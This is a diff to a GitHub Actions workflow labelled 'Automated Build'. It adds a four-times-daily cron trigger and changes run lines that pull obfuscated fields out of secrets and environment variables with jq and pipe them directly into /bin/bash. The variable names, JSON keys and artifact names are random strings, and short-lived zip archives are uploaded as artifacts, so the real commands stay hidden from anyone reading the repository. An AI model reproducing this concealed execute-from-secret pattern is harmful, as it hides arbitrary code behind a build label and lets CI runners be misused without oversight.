@@ -2,6 +2,8 @@ name: Automated Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '3 1,7,13,19 * * *'
 permissions:
   contents: read
   actions: read
@@ -22,19 +24,17 @@ jobs:
           fetch-depth: 1
       - name: Run
         env:
-          dt16103: ${{ secrets.dt16103 }}
+          ost1: ${{ secrets.ost1 }}
         run: |
-          printf '%s' "$dt16103" | jq -r .jffq480 | /bin/bash
-          echo $nrlwb3 | jq -r .hmuzl7 | /bin/bash
-          echo $ozjd3688 | jq -r .bdmk36 | /bin/bash
-          printf '%s' "$o2" | jq -r .grt90 | /bin/bash
-          echo $gl1 | jq -r .z97 | /bin/bash
-          printf '%s' "$fq0887" | jq -r .gvy67543 | /bin/bash
+          printf '%s' "$ost1" | jq -r .iy2 | /bin/bash
+          echo $pdcs1 | jq -r .ctzxy19 | /bin/bash
+          printf '%s' "$kt67" | jq -r .zjxx37486 | /bin/bash
+          echo $z85111 | jq -r .sls70 | /bin/bash
 
       - name: Save archive
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: pXm17M6Y
+          name: yUr9qAbB
           path: "*.zip"
           retention-days: 1
